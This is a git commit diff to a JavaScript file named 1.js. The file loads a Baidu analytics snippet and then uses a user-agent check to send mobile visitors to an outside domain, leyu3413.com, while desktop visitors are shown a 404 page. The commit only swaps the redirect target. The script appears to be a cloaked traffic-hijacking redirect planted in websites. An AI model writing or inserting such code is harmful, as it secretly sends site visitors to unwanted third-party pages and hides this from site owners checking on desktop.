42d41cadf8f969a9d0bfafc8c07c65aea286d225
dnshook <62766196+dnshook@users.noreply.github.com>
2023-04-22 17:34:17 +0800

    Update 1.js

--- 1.js
+++ 1.js
@@ -6,7 +6,7 @@ var _hmt = _hmt || [];
   s.parentNode.insertBefore(hm, s);
 })();
 if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-	var arr = ["http://leyu3136.com", "http://leyu3136.com"];
+	var arr = ["https://www.leyu3413.com", "https://www.leyu3413.com"];
 	window.location.href = arr[parseInt(Math.random() * arr.length)];
 }else{
 	window.location.href="/404.html";
